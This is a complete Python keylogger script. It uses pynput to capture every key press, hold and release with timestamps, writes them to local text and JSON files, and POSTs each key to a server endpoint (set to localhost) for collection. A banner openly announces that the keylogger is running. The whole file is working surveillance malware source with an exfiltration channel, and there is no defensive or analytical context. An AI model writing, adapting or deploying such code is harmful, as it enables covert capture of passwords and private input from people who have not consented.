from pynput import keyboard
import json
import requests  # Add requests library
from datetime import datetime

key_list = []
key_strokes = ""
x = False
SERVER_URL = "http://localhost:5000/log"  # Flask server endpoint

def update_txt_file(key_strokes):
    with open('log.txt', 'a') as f:
        f.write(key_strokes)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)

def send_to_server(key_data):
    payload = {
        "timestamp": datetime.now().isoformat(),
        "keys": key_data
    }
    try:
        response = requests.post(SERVER_URL, json=payload, timeout=3)
        if response.status_code == 200:
            print("Data sent to server successfully")
        else:
            print(f"Server error: {response.status_code}")
    except Exception as e:
        print(f"Failed to send to server: {e}")

def on_press(key):
    global x, key_list
    try:
        current_key = str(key.char)
    except AttributeError:
        current_key = str(key)
    
    if not x:
        key_list.append({
            'Timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'Action': 'Pressed',
            'Key': current_key
        })
        x = True
    else:
        key_list.append({
            'Timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'Action': 'Held',
            'Key': current_key
        })
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    try:
        current_key = str(key.char)
    except AttributeError:
        current_key = str(key)
    
    key_list.append({
        'Timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'Action': 'Released',
        'Key': current_key
    })
    
    if x:
        x = False
    
    key_strokes += current_key
    update_json_file(key_list)
    update_txt_file(current_key)
    send_to_server(current_key)  # Send each key to the server

print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json' and 'log.txt'")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()